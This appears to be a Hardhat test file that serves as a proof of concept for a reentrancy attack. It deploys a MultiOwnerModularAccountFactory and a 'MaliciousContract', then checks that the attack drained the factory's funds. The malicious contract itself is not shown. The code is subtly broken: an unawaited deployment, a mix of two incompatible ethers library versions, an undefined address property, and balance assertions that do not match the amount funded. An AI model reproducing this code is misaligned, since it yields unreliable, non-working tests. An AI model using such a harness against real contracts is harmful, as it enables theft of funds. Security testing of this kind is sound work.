const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack Test", function () {
  it("Should drain funds from the factory via reentrancy", async function () {
    const dummyOwnerAddress = ethers.Wallet.createRandom().address;
    const dummyMultiOwnerPluginAddress = ethers.Wallet.createRandom().address;
    const dummyImplementationAddress = ethers.Wallet.createRandom().address;
    const dummyEntryPointAddress = ethers.Wallet.createRandom().address;

    // Generate a dummy bytes32 value for the manifest hash
    const dummyMultiOwnerPluginManifestHash =
      ethers.encodeBytes32String("dummy hash");

    // get list of accounts
    const [deployer] = await ethers.getSigners();

    const factory = ethers.deployContract(
      "MultiOwnerModularAccountFactory",
      [
        deployer.address,
        dummyMultiOwnerPluginAddress,
        dummyImplementationAddress,
        dummyMultiOwnerPluginManifestHash,
        dummyEntryPointAddress
      ],
      { value: 1_000_000 }
    );

    console.log(`Factory address: ${factory.address}`);

    const Malicious = await ethers.getContractFactory("MaliciousContract");
    const malicious = await Malicious.deploy(factory.address);

    // Attacking the factory
    await malicious.attack({ value: ethers.parseEther("1") });

    // Checking the balances after the attack
    const factoryBalance = await ethers.provider.getBalance(factory.address);
    const maliciousBalance = await malicious.getBalance();
    console.log(
      `Factory balance after attack: ${ethers.utils.formatEther(
        factoryBalance
      )} ETH`
    );
    console.log(
      `Malicious contract balance after attack: ${ethers.utils.formatEther(
        maliciousBalance
      )} ETH`
    );

    expect(factoryBalance).to.be.below(ethers.utils.parseEther("9"));
    expect(maliciousBalance).to.be.above(ethers.utils.parseEther("1"));
  });
});
